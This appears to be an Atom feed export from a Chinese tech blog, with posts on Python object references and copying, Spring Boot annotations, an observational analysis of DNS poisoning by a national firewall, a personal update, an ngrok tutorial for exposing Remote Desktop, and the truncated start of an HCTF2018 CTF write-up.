class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = 10</span><br><span class="line">print(id(a)) #1825271552</span><br><span class="line">a += 1</span><br><span class="line">print(id(a)) #1825271584</span><br><span class="line"></span><br><span class="line">list1 = [1,2,3]</span><br><span class="line">print(id(list1)) #1853070359112</span><br><span class="line">list1.append(a)</span><br><span class="line">print(id(list1)) #1853070359112</span><br></pre></td></tr></table></figure></p><p>python解释器在运行时，会根据是否为可变类型决定是在原来内存地址上修改还是进行重新引用。<br>而如果将参数传入函数时，刚开始形参与实参指向的是同一内存地址，而如果函数内部对参数进行修改的话，会根据是否为可变类型决定是否断开对原来对象的引用。<br>python中内置了引用计数器，每当进行一次引用时，该对象的引用计数器+1，而取消一次引用时，则-1，如果归0，则销毁这个对象，这也是python的垃圾回收机制之一。<br>结合文初的问题，new_dict其实引用的是dict1的内存地址(相当于C/C++中的指针)，而由于字典属于可变类型，所以进行修改时不会改变其内存对象。而append方法实际上追加的是该对象的引用。所以对该字典修改后则列表中的所有元素也会跟着修改。</p><h1 id="浅拷贝与深拷贝"><a href="#浅拷贝与深拷贝" class="headerlink" title="浅拷贝与深拷贝"></a>浅拷贝与深拷贝</h1><p>那标准库中的copy包又是怎么一回事呢。copy与deepcopy的差别又是什么？我们查看官方文档<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python 中赋值语句不复制对象，而是在目标和对象之间创建绑定 (bindings) 关系。</span><br><span class="line">浅层复制和深层复制之间的区别仅与复合对象 (即包含其他对象的对象，如列表或类的实例) 相关:</span><br><span class="line">一个 浅层复制 会构造一个新的复合对象，然后（在可能的范围内）将原对象中找到的 引用 插入其中。</span><br><span class="line">一个 深层复制 会构造一个新的复合对象，然后递归地将原始对象中所找到的对象的 副本 插入。</span><br></pre></td></tr></table></figure></p><p>通过官方文档我们可以知道：<br>copy是复制表层对象，如果对象中还存在对象，则内部对象依旧进行引用。字典可以使用dict.copy进行浅拷贝，而list则可以通过切片操作[:]进行浅拷贝。<br>而deepcopy则会递归复制对象中的对象。<br>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">list1 = [1,2,3]</span><br><span class="line">a = &#123;&apos;1&apos;:&apos;&apos;,&apos;2&apos;:list1&#125;</span><br><span class="line">all_list = []</span><br><span class="line">for i in range(2):</span><br><span class="line">    new = copy.copy(a)</span><br><span class="line">    new[&apos;1&apos;] = i</span><br><span class="line">    all_list.append(new)</span><br><span class="line">print(all_list) #[&#123;&apos;1&apos;: 0, &apos;2&apos;: [1, 2, 3]&#125;, &#123;&apos;1&apos;: 1, &apos;2&apos;: [1, 2, 3]&#125;]</span><br><span class="line">list1[0] = 0</span><br><span class="line">print(all_list) #[&#123;&apos;1&apos;: 0, &apos;2&apos;: [0, 2, 3]&#125;, &#123;&apos;1&apos;: 1, &apos;2&apos;: [0, 2, 3]&#125;]</span><br></pre></td></tr></table></figure><br>可以发现内部对象依旧是进行引用，而使用深拷贝后修改list1中的元素也不会改变字典中的元素。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>今天重新学习了一下python的引用，即使之前就学过，但重新学习写文章后依旧收获颇丰。引用是python中最常接触的操作，引用相当于指针，但又与指针不同，当修改数据时python会根据类型是否可变来选择是否修改内存地址，还是直接在内存地址中修改数据。<br>而拷贝往往是因为需要对象的副本来进行操作。当然一不注意就会掉入陷阱，直接赋值导致引用了同一对象，当一处修改则所有值改变。而copy与deepcopy就是为了解决这个问题，而两者的区别就是在于是否对子对象进行拷贝。当然在使用deepcopy时要注意递归循环。而对象的拷贝也可以通过定义 __copy__() 和 __deepcopy__()来实现。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在爬取某游戏攻略的时候，发现写入到json的文件中全是重复的字典，但是数据库中的数据却是正常的，在寻找了一段时间的bug后，想起来pyt
      
    
    </summary>
    
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Springboot常用注解</title>
    <link href="http://re0.top/2020/02/10/spring-annotation/"/>
    <id>http://re0.top/2020/02/10/spring-annotation/</id>
    <published>2020-02-10T13:20:00.000Z</published>
    <updated>2020-03-04T08:24:59.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在使用springboot进行开发，也学习了不少spring的知识，记录一下spring中常用的注解，方便自己学习与查找。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h2><p>bean是一个被实例化，组装，并通过 Spring IoC 容器所管理的对象。<br>该注解主要定义在@Configuration或者@Component注解的类里，声明该方法的返回值是一个bean。</p><h2 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h2><p>定义一个最普通的组件(spring管理bean)，注入到spring容器中进行管理。</p><h2 id="Repository"><a href="#Repository" class="headerlink" title="@Repository"></a>@Repository</h2><p>是@Component的拓展，被这个注解的类表示为DAO层实现。</p><h2 id="Service"><a href="#Service" class="headerlink" title="@Service"></a>@Service</h2><p>是@Component的拓展，被这个注解的类表示为Service层实现。</p><h2 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h2><p>被这个注解的类表示为Web层实现。通常用于控制web逻辑。</p><h2 id="RestController"><a href="#RestController" class="headerlink" title="@RestController"></a>@RestController</h2><p>Spring 4后加入的新注解，为@Controller 与 @ResponseBody的结合。在其注解的控制器中可直接在页面中返回数据。</p><h2 id="ControllerAdvice，-RestControllerAdvice"><a href="#ControllerAdvice，-RestControllerAdvice" class="headerlink" title="@ControllerAdvice，@RestControllerAdvice"></a>@ControllerAdvice，@RestControllerAdvice</h2><p>控制类增强，通常做全局处理。</p><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h2><p>最常用到的注解之一，会将HTTP请求映射到控制器中。</p><h2 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h2><p>用于获取请求中的参数。</p><h2 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h2><p>与@RequestParam类似，只不过一个在参数部分，另一个在URL路径部分。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过@PathVariable，例如/users/1</span><br><span class="line">通过@RequestParam，例如/users?userid=1</span><br></pre></td></tr></table></figure></p><h2 id="Valid"><a href="#Valid" class="headerlink" title="@Valid"></a>@Valid</h2><p>参数校验，在model里面设置每个参数的校验方法，例如@NotNull，@NotBlank，之后在controller中的方法参数上添加@Valid注解，就可以对请求参数进行校验，并将校验结果返回在一个BindingResult实例中，所以参数后一定要紧跟BindingResult！</p><h2 id="ModelAttribute"><a href="#ModelAttribute" class="headerlink" title="@ModelAttribute"></a>@ModelAttribute</h2><h3 id="1-在方法上使用"><a href="#1-在方法上使用" class="headerlink" title="1.在方法上使用"></a>1.在方法上使用</h3><p>标注在方法上的@ModelAttribute说明方法是用于添加一个或多个属性到model上。在同一个控制器中，注解了@ModelAttribute 的方法实际上会在@RequestMapping 方法之前被调用。通常被用来填充一些公共需要的属性或数据。</p><h3 id="2-在方法参数上使用"><a href="#2-在方法参数上使用" class="headerlink" title="2.在方法参数上使用"></a>2.在方法参数上使用</h3><p>标注在方法参数上的@ModelAttribute说明了该方法参数的值将由model中取得。在SpringMvc中称为数据绑定。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/login&quot;,method = RequestMethod.POST)</span><br><span class="line">public ReturnMsg login(@ModelAttribute User user, HttpServletResponse response)</span><br></pre></td></tr></table></figure></p><p>可直接把参数自动与user实例的字段进行绑定。</p><h2 id="ExceptionHandler"><a href="#ExceptionHandler" class="headerlink" title="@ExceptionHandler"></a>@ExceptionHandler</h2><p>用来定义函数针对的异常类型。如果@ExceptionHandler方法是在控制器内部定义的，那么它会接收并处理由控制器（或其任何子类）中的@RequestMapping方法抛出的异常。<br>如果将@ExceptionHandler方法定义在@ControllerAdvice类中，那么它会处理相关控制器中抛出的异常。例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@ExceptionHandler(value = CustomException.class)</span><br></pre></td></tr></table></figure></p><p>则是处理CustomException异常，对其他异常不处理。</p><h2 id="Autowired"><a href="#Autowired" class="headerlink" title="@Autowired"></a>@Autowired</h2><p>自动装配注解，例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">private UserDAO userDAO;</span><br></pre></td></tr></table></figure></p><p>意思是让spring自动向userDAO中注入一个UserDAO的实例。<br>Spring IoC容器扫描到@Autowired注解会去查询其实现类，写法为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Autowired</span><br><span class="line">private IUserDAO userDAO;</span><br></pre></td></tr></table></figure></p><p>其中IUserDAO为接口，而UserDAO为实现类。</p><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h2><p>标注在类上，相当于把这个类作为spring的配置类。</p><h2 id="ConfigurationProperties"><a href="#ConfigurationProperties" class="headerlink" title="@ConfigurationProperties"></a>@ConfigurationProperties</h2><p>将部分参数配置在application.properties 或 application.yml 文件中，通过这个注解，可以获取到这些值。<br>1.可以与@Component一起使用，使该类被Component Scan扫描到，并激活。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Component</span><br><span class="line">@ConfigurationProperties(prefix=&quot;mail&quot;)</span><br><span class="line">public class ConnectionSettings &#123;</span><br><span class="line">    private String username;</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>2.也可以使用@EnableConfigurationProperties与@Configuration，但是不推荐。<br>3.第三种则是使用@Bean方式在标有@Configuration的类进行注入，这种方式通常可以用在对第三方类进行配置属性注册。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@Bean</span><br><span class="line">@ConfigurationProperties(prefix = &quot;mail&quot;)</span><br><span class="line">public Mail mail()&#123;</span><br><span class="line">return new Mail();</span><br><span class="line">&#125;</span><br><span class="line">//当需要的时候使用Autowired进行注入</span><br></pre></td></tr></table></figure></p><p>这里有一个开发时发现的问题。在某个工具类中使用@Autowired注入获取对象时，发现无法其属性值总为null，查了许多资料，发现是spring在实例化Bean时，先通过反射调用构造方法生成一个基本对象，然后再填充属性。填充属性之前属性值都为默认值，引用类为null，构造方法中使用属性对象时属性对象还未被设置，所以为null。<br>这里需要在这个工具类的构造器中将Bean作为参数显式地传入，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//需要将该类定义为组件，添加到spring容器后spring才会自动注入实例(此时可以不使用@Autowired)</span><br><span class="line">@Component</span><br><span class="line">public class OneUtil &#123;</span><br><span class="line"></span><br><span class="line">    private A a;</span><br><span class="line"></span><br><span class="line">    // 构造器中将Bean作为参数显式的传入，spring装配时自动将实例的值传给该组件，可以有效避免NPE问题；</span><br><span class="line">    public OneUtil(A a)&#123;</span><br><span class="line">        this.a = a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h2 id="MapperScan"><a href="#MapperScan" class="headerlink" title="@MapperScan"></a>@MapperScan</h2><p>可以指定要扫描的Mapper类的包的路径，不用在每个Mapper类上注解@Mapper。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这篇查了许多资料，在用spring写了个demo后觉得需要理解这些注解。写完文章后发现要理解一个框架比使用一个框架难得多，接下来就是不断在开发中寻找问题与解决办法，总结经验。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近在使用springboot进行开发，也学习了不少spring的知识，记录一下spring中常用的注解，方便自己学习与查找。&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DNS投毒分析</title>
    <link href="http://re0.top/2020/01/05/dns-cache-pollution/"/>
    <id>http://re0.top/2020/01/05/dns-cache-pollution/</id>
    <published>2020-01-05T14:20:28.000Z</published>
    <updated>2020-01-05T15:31:58.134Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近因为研究了下DNSsec技术突然想起来著名的DNS投毒，就是DNS缓存污染，今天趁着有点时间研究下某知名防火墙对DNS是怎么进行污染的。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于DNS采用UDP协议来进行查询和应答，由于UDP是无连接的，所以当我们发送一个DNS请求时，如果有多个DNS响应包时，操作系统一般是以最先收到的响应包为准，这就使得了如果攻击者在正规DNS服务器的响应包到达之前伪造了一份DNS响应，便可将用户导向不一致的IP地址，如此便实现的DNS污染。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>在中国大陆的运营商DNS服务器（尤其是移动），一般情况下都会对某些域名进行屏蔽，即当你向该服务器请求DNS解析时(例如google)，服务器会响应一个ip地址为0.0.0.0的地址。我们以我本地移动的DNS为例：<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/3.png" alt=""><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/5.png" alt=""><br>当我们对google主域名进行DNS查询时，我们可以发现移动的dns解析只返回了0.0.0.0的ip地址。<br>而尝试114dns与阿里DNS，<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/2.png" alt=""><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/4.png" alt=""><br>除了会返回一个0.0.0.0的地址外，还会有另一个响应包，地址为69.172.225.13和31.13.71.23，这两个地址都不是指向google的，而是指向了其他地区，有法国的，有美国的，经过多次测试，这个ip地址并不是固定的，而是随机指向一个ip地址。<br>因此我猜测这个dns响应应该是防火墙所返回的。<br>进一步测试谷歌的DNS服务器。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/7.png" alt=""><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/6.png" alt=""><br>我们收到了多个DNS响应。我进行了多次测试，无论是8.8.8.8还是8.8.4.4，有时候会返回三个响应，有时候会返回四个响应，我猜测应该是多个出国网关都部署了防火墙，才会有此结果。<br>猜测可能是关键字匹配，我们接着测试不存在的域名会如何返回。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/9.png" alt=""><br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/8.png" alt=""><br>我们可以发现8.8.4.4竟然还是返回了两个ip地址！<br>使用美国的服务器的进行dns查询，只会得到NXDOMAIN即域名不存在的结果。<br><img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/dns/10.png" alt=""><br>而在我进行重复测试时发现，无论是8.8.8.8还是8.8.4.4，有时候会有正常结果返回，而有时候却只有错误的ip地址，甚至连域名不存在都无法返回。这也是防火墙高明所在。  </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>有一点要说明的是，在使用google dns进行正常域名解析时，是正常的。无论是8.8.8.8还是8.8.4.4。<br>那基本可以得出结论<br>1.运营商网络的DNS会将屏蔽域名解析为0.0.0.0<br>2.google的dns虽然在中国大陆可以使用，但防火墙制造了一种假象，使得每个人认为它返回域名都是正常，在对某些被屏蔽域名进行解析时，它并不会都返回正确的结果，我猜测正确结果会不时地被防火墙所拦截，从而营造出是DNS服务器自身的问题。而如果正确结果没被拦截，响应也通常会在最后到达，但这时候通常已经不管用了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近因为研究了下DNSsec技术突然想起来著名的DNS投毒，就是DNS缓存污染，今天趁着有点时间研究下某知名防火墙对DNS是怎么进行污染的。
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈最近</title>
    <link href="http://re0.top/2019/11/12/2019-11-12/"/>
    <id>http://re0.top/2019/11/12/2019-11-12/</id>
    <published>2019-11-12T10:32:47.000Z</published>
    <updated>2019-11-16T13:57:12.635Z</updated>
    
    <content type="html"><![CDATA[<p>几个月没写文章，谈一谈最近一年都在干些啥事吧。<br>从18年末开始，我就很少参加CTF比赛，不管大的小的，虽然没有参加，但还是有在业余的时候看看一些大型比赛的解题思路和漏洞报告。<br>这一年来，也是学了不少东西，主要是使用python写了两个脚本，一个抢课脚本，一个群体签到软件，主要是感觉挺好玩的。18年末到19年1月左右，主要是深入学习了计算机组成还有数据库，然后学习了Vue结合PHP写了个简单的图书管理系统。<br>19年寒假的时候开始学习php的laravel框架，正好寒假后回学校有一门课程也是使用php设计web应用。<br>然后下半学期开始学习TensorFlow，起因是为了验证码识别，然后接着学了keras后端，写了一个针对学校某系统的验证码识别。<br>接着是两个月的中心放在深入学习计算机网络，网络协议，还有操作系统上面，特别是操作系统，深入之后也有了自己的理解，收获还是蛮大的。<br>暑假学习了点spring框架，但没有使用spring写点东西。然后就是学习了下网站渗透的各种姿势。剩下时间基本上在练车考驾照。<br>这学期开始课内主要是学习网络安全相关知识和python的编程，但这些基本上大一就自学过了。大部分时间在完善群体签到软件，Android端也从5月份开始学习了挺多。然后就是基本上在重学数据结构与算法，深入理解再与实际开发相结合，主要是为了之后的面试做准备，收获颇丰。<br>接下来我还是比较迷茫的，是走安全路线还是开发路线也还没想好。不过我想，基础还是得先打好吧，所以重学了数据结构。走一步看一步吧，加油。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;几个月没写文章，谈一谈最近一年都在干些啥事吧。&lt;br&gt;从18年末开始，我就很少参加CTF比赛，不管大的小的，虽然没有参加，但还是有在业余的时候看看一些大型比赛的解题思路和漏洞报告。&lt;br&gt;这一年来，也是学了不少东西，主要是使用python写了两个脚本，一个抢课脚本，一个群体
      
    
    </summary>
    
    
      <category term="随笔" scheme="http://re0.top/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>使用ngrok实现内网远程桌面</title>
    <link href="http://re0.top/2019/04/01/ngrok/"/>
    <id>http://re0.top/2019/04/01/ngrok/</id>
    <published>2019-04-01T14:20:28.000Z</published>
    <updated>2019-04-03T09:42:36.725Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近打算在机房里面用自己的电脑，笔记本太重不想背在身上，就决定使用远程控制。之前一直在用teamviewer，这几天在想为什么不用远程桌面呢，于是我便开始研究如何内网穿透使笔记本的3389端口暴露到公网上。<br>网上找了几种方法，无非就是那几个在国内比较有名的产品，花生壳和nat123。当然他们也不都是免费的，免费的也有种种限制，后来找到了ngrok来进行内网穿透，ngrok1.x是开源的，我便想使用ngrok来完成想法。</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><ol><li>一台有公网ip的vps服务器</li><li>一个任意域名</li></ol><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="服务器环境"><a href="#服务器环境" class="headerlink" title="服务器环境"></a>服务器环境</h2><p>由于ngrok使用go语言编写的，需要先安装go环境。<br>先到golang官网下载<a href="https://dl.google.com/go/go1.12.1.linux-amd64.tar.gz" target="_blank" rel="noopener">linux安装包</a><br>执行<code>sudo tar zxvf go1.12.1.linux-amd64.tar.gz -C /usr/local</code><br>之后配置环境变量<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br><span class="line">//添加</span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/root/program_develop/go_demo</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br><span class="line">//使环境变量生效</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure><br>执行<code>go version</code>出现版本就安装成功了。</p><h2 id="域名DNS解析设置"><a href="#域名DNS解析设置" class="headerlink" title="域名DNS解析设置"></a>域名DNS解析设置</h2><p>首先将一个子域名解析到自己的服务器上，例如我将remote.xxxxx.com 解析到自己的服务器ip上（A记录）.随后将 *.remote.xxxxx.com 解析到remote.xxxxx.com上（CNAME类型）。<br>至此DNS设置告一段落。</p><h2 id="安装ngrok"><a href="#安装ngrok" class="headerlink" title="安装ngrok"></a>安装ngrok</h2><h3 id="下载ngrok"><a href="#下载ngrok" class="headerlink" title="下载ngrok"></a>下载ngrok</h3><p>先下载ngrok源码，然后切换到目录<br><code>git clone https://github.com/inconshreveable/ngrok.git</code><br><code>cd ngrok</code></p><h3 id="生成证书与替换证书"><a href="#生成证书与替换证书" class="headerlink" title="生成证书与替换证书"></a>生成证书与替换证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//生成</span><br><span class="line"><span class="built_in">export</span> NGROK_DOMAIN=<span class="string">"remote.xxxxx.com"</span></span><br><span class="line">openssl genrsa -out rootCA.key 2048</span><br><span class="line">openssl req -x509 -new -nodes -key rootCA.key -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -days 5000 -out rootCA.pem</span><br><span class="line">openssl genrsa -out device.key 2048</span><br><span class="line">openssl req -new -key device.key -subj <span class="string">"/CN=<span class="variable">$NGROK_DOMAIN</span>"</span> -out device.csr</span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000</span><br><span class="line"></span><br><span class="line">//替换</span><br><span class="line">cp rootCA.pem assets/client/tls/ngrokroot.crt</span><br><span class="line">cp device.crt assets/server/tls/snakeoil.crt</span><br><span class="line">cp device.key assets/server/tls/snakeoil.key</span><br></pre></td></tr></table></figure><h3 id="编译linux服务端"><a href="#编译linux服务端" class="headerlink" title="编译linux服务端"></a>编译linux服务端</h3><p><code>GOOS=linux GOARCH=amd64 make release-server</code></p><h3 id="编译windows客户端"><a href="#编译windows客户端" class="headerlink" title="编译windows客户端"></a>编译windows客户端</h3><p><code>GOOS=windows GOARCH=amd64 make release-client</code><br>无论是编译客户端还是服务端，都会在ngrok/bin目录下生成可执行文件。</p><h2 id="运行与使用"><a href="#运行与使用" class="headerlink" title="运行与使用"></a>运行与使用</h2><h3 id="在服务器上"><a href="#在服务器上" class="headerlink" title="在服务器上"></a>在服务器上</h3><p>进入ngrok/bin目录，执行<code>./ngrokd -domain=&quot;remote.xxxxx.com&quot; -httpAddr=&quot;:8001&quot; -httpsAddr=&quot;:4443&quot; -tunnelAddr=&quot;:8083&quot;</code><br>这里由于服务器的80和443端口被占用，就换了任意一个端口来侦听http和https，当然我们用不到这个。其次我使用了一个端口来侦听客户端的服务，客户端也是通过这个端口来使用ngrok。<br>还有，如果是想后台运行，建议使用screen或者nohub命令来实现。<br>然后到云服务器的安全组中放行这些端口（不要忘记3389），以保证服务正常运行。</p><h3 id="在个人电脑上"><a href="#在个人电脑上" class="headerlink" title="在个人电脑上"></a>在个人电脑上</h3><p>首先先开启本机的远程桌面服务（好像是要win10专业版才能使用远程桌面，具体请参照微软官网。）<br>然后防火墙放行3389端口。<br>将服务器上的ngrok/bin/windows_amd64/ngrok.exe拷贝到个人电脑上，然后在同目录下创建<br>ngrok.cfg和ngrok.bat两个文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//ngrok.cfg</span><br><span class="line">server_addr: &quot;remote.xxxxx.com:8083&quot;</span><br><span class="line">trust_host_root_certs: false</span><br><span class="line">tunnels:</span><br><span class="line">  mstsc:</span><br><span class="line">    remote_port: 3389</span><br><span class="line">    proto:</span><br><span class="line">      tcp: &quot;127.0.0.1:3389&quot;</span><br><span class="line"></span><br><span class="line">//ngrok.bat</span><br><span class="line">ngrok.exe -config=ngrok.cfg start mstsc</span><br></pre></td></tr></table></figure><br>双击ngrok.bat文件，显示状态为online就成功了，在远程桌面连接中输入remote.xxxxx.com便可以开始使用远程桌面了。</p><h1 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h1><p>虽然实现了远程桌面，但其实效果并不是特别好，其主要原因还是vps限制了速率，毕竟学生机只有1M的带宽，如果有4M以上的带宽也许能顺畅一点，不过1M的速率简单使用也就已经足够了。<br>后来我又将本机的FTP服务穿透到公网，在由于IIS无法设置主被动模式，导致无法正常使用IIS自带的FTP服务，也只好作罢。理论上使用可以设置端口的其他软件搭建的FTP服务，就能成功穿透，但速度也是堪忧。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近打算在机房里面用自己的电脑，笔记本太重不想背在身上，就决定使用远程控制。之前一直在用teamviewer，这几天在想为什么不用远程桌面呢
      
    
    </summary>
    
    
      <category term="web" scheme="http://re0.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>HCTF2018 web部分Writeup</title>
    <link href="http://re0.top/2018/11/12/hctf2018wp/"/>
    <id>http://re0.top/2018/11/12/hctf2018wp/</id>
    <published>2018-11-12T12:20:28.000Z</published>
    <updated>2018-11-14T09:20:19.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周末忙着准备期中考试，HCTF也只是匆匆看了几题，有个思路之后就没再做了，这两天趁着服务器还没关闭来重新复现一下，相比去年的HCTF，今年题目自己也能有点思路了，不过相比出题人，自己还是差了不少，废话不多说，看各个题目。</p><h1 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h1><p>一道文件包含题。访问查看注释发现有源代码。<img src="https://zer0blog.oss-cn-hangzhou.aliyuncs.com/blog_image/hctf2018wp/warmup01.png" alt=""><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 